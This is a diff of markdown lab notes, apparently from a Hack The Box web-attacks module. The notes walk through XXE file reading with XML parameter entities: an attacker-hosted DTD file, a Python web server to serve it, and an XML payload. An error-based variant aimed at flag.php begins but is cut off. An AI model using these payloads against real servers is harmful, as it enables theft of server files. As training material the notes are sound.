@@ -56,14 +56,18 @@ After that, if we reference the `&joined;` entity, it should contain our escaped
 To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.
 
 1. Create dtd file:
+
 ```
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+
 ```
 2. Start python web server on port 8000
 ```
 python3 -m http.server 8000
 ```
+
 3. Send updated payload:
+
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
@@ -75,6 +79,7 @@ python3 -m http.server 8000
 ]>
 <root><email>&joined;</email></root>
 ```
+
 ![XXE CDATA Result](/images/htb/web-attacks/xxe_cdata.png)
 
 ##### Error Based
@@ -98,11 +103,13 @@ Steps to read the `flag.php` using `Error Based` XXE:
 ```
 
 3. Create a python webserver
+
 ```
 python3 -m http.server 8000
 ```
 
 4. Send the below request to read flag.php
+
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 
